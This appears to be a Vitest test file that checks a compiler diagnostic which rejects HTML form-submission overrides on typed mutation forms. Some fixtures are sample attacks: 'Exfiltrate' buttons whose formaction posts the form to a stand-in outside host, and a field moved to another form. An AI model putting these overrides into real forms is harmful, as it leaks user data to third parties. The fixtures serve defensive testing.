import { describe, expect, it } from 'vitest';

import { compileComponentModule } from './index.js';

interface ExtraFile {
  readonly fileName: string;
  readonly source: string;
}

function compile(source: string, extraFiles: readonly ExtraFile[] = []) {
  return compileComponentModule({
    extraFiles,
    fileName: 'src/browser-final-review.tsx',
    source,
  } as Parameters<typeof compileComponentModule>[0] & {
    extraFiles: readonly ExtraFile[];
  });
}

function kv242(source: string, extraFiles: readonly ExtraFile[] = []) {
  return compile(source, extraFiles).diagnostics.filter(
    (diagnostic) => diagnostic.code === 'KV242',
  );
}

const mutationDeclaration = `
export const save = mutation('account/save', {
  input: s.object({ email: s.string().optional() }),
  handler() { return null; },
});
`;

describe('final browser mutation-form adversarial review', () => {
  it.each([
    ['FORMAction', ''],
    ['formMethod', ''],
    ['FORMENCTYPE', 'text/plain'],
    ['formTarget', '_blank'],
    ['FORMNOVALIDATE', null],
  ])('rejects direct %s transport overrides, including empty values', (name, value) => {
    const attribute = value === null ? name : `${name}=${JSON.stringify(value)}`;
    expect(
      kv242(`
${mutationDeclaration}
export const View = component({
  render: () => <form mutation={save}><button ${attribute}>Save</button></form>,
});
`),
    ).not.toEqual([]);
  });

  it('follows local, underscored, aliased imported, and nested components', () => {
    const diagnostics = kv242(
      `
import { ImportedUnsafe as RenamedUnsafe } from './submitters';
${mutationDeclaration}
const _LocalUnsafe = () => <button formtarget="_blank">Local</button>;
function Nested() { return <RenamedUnsafe />; }
export const View = component({
  render: () => <form mutation={save}><_LocalUnsafe /><Nested /></form>,
});
`,
      [
        {
          fileName: 'src/submitters.tsx',
          source: `export function ImportedUnsafe() {
  return <input type="submit" formenctype="text/plain" />;
}`,
        },
      ],
    );
    const messages = diagnostics.map((diagnostic) => diagnostic.message);
    expect(messages).toEqual(
      expect.arrayContaining([
        expect.stringContaining('component-rendered formtarget'),
        expect.stringContaining('component-rendered formenctype'),
      ]),
    );
  });

  it.each([
    [
      'recursive component',
      `function Recursive() { return <Recursive />; }
export const View = component({ render: () => <form mutation={save}><Recursive /></form> });`,
      [],
    ],
    [
      'opaque component',
      `function Opaque({ child }) { return child; }
export const View = component({ render: (_q, state) => <form mutation={save}><Opaque child={state.child} /></form> });`,
      [],
    ],
    [
      'namespace component',
      `import * as UI from './submitters';
export const View = component({ render: () => <form mutation={save}><UI.Unsafe /></form> });`,
      [{ fileName: 'src/submitters.tsx', source: 'export const Unsafe = () => <button />;' }],
    ],
    [
      'barrel re-export component',
      `import { Unsafe } from './barrel';
export const View = component({ render: () => <form mutation={save}><Unsafe /></form> });`,
      [
        { fileName: 'src/barrel.ts', source: "export { Unsafe } from './submitters';" },
        { fileName: 'src/submitters.tsx', source: 'export const Unsafe = () => <button />;' },
      ],
    ],
  ])('fails closed for a %s', (_label, view, extraFiles) => {
    expect(
      kv242(`${mutationDeclaration}\n${view}`, extraFiles as readonly ExtraFile[]),
    ).not.toEqual([]);
  });

  it('allows one statically separate native form but rejects duplicate native ids', () => {
    const safe = kv242(`
${mutationDeclaration}
export const View = component({ render: () => <>
  <form mutation={save}><button>Save</button></form>
  <form id="preview" action="/preview" method="get" />
  <button form="preview" formaction="/preview/compact" formmethod="get">Preview</button>
</> });
`);
    expect(safe).toEqual([]);

    const duplicate = kv242(`
${mutationDeclaration}
export const View = component({ render: () => <>
  <form mutation={save}><button>Save</button></form>
  <form id="preview" action="/preview-a" method="get" />
  <form id="preview" action="/preview-b" method="get" />
  <button form="preview" formaction="/preview/compact" formmethod="get">Preview</button>
</> });
`);
    expect(duplicate).not.toEqual([]);
  });

  it('rejects an imported sibling submitter associated to a typed form', () => {
    const diagnostics = kv242(
      `
import { ExternalOverride } from './external-override';
${mutationDeclaration}
export const View = component({ render: () => <>
  <form id="account-save" mutation={save}><button>Save</button></form>
  <ExternalOverride />
</> });
`,
      [
        {
          fileName: 'src/external-override.tsx',
          source: `export const ExternalOverride = () => (
  <button form="account-save" formaction="https://outside.example/collect" formmethod="post">
    Exfiltrate
  </button>
);`,
        },
      ],
    );
    expect(diagnostics).not.toEqual([]);
  });

  it('rejects an external submitter associated to an imported typed form', () => {
    const diagnostics = kv242(
      `
import { ImportedTypedForm } from './typed-form';
export const View = component({ render: () => <>
  <ImportedTypedForm />
  <button form="account-save" formaction="https://outside.example/collect" formmethod="post">
    Exfiltrate
  </button>
</> });
`,
      [
        {
          fileName: 'src/typed-form.tsx',
          source: `${mutationDeclaration}
export const ImportedTypedForm = component({
  render: () => <form id="account-save" mutation={save}><button>Save</button></form>,
});`,
        },
      ],
    );
    expect(diagnostics).not.toEqual([]);
  });

  it('rejects component-rendered controls that change their form owner', () => {
    const diagnostics = kv242(
      `
import { ReassociatedField } from './reassociated-field';
${mutationDeclaration}
export const View = component({ render: () => <>
  <form id="other" action="/preview" method="get" />
  <form mutation={save}><ReassociatedField /></form>
</> });
`,
      [
        {
          fileName: 'src/reassociated-field.tsx',
          source:
            'export const ReassociatedField = () => <input form="other" name="email" value="attacker@example.test" />;',
        },
      ],
    );
    expect(diagnostics).not.toEqual([]);
  });
});
